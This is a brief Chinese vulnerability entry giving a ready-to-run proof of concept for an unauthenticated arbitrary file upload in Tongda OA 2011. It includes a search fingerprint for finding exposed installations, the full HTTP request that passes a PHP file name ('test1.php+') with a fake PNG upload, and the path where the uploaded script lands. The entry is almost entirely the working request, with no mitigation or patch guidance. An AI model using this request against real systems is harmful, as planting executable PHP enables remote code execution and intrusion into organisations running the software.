# 通达OAprivateUpload存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/vmeet/privateUpload.php?fileName=test1.php+ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: {hostname}`　`Content-Length: 149`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="1.png"
Content-Type: image/png
123
--00content0boundary00--

上传文件位置
/general/vmeet/upload/temp/test1.php
```

**其他**
- 通达OA privateUpload存在前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2011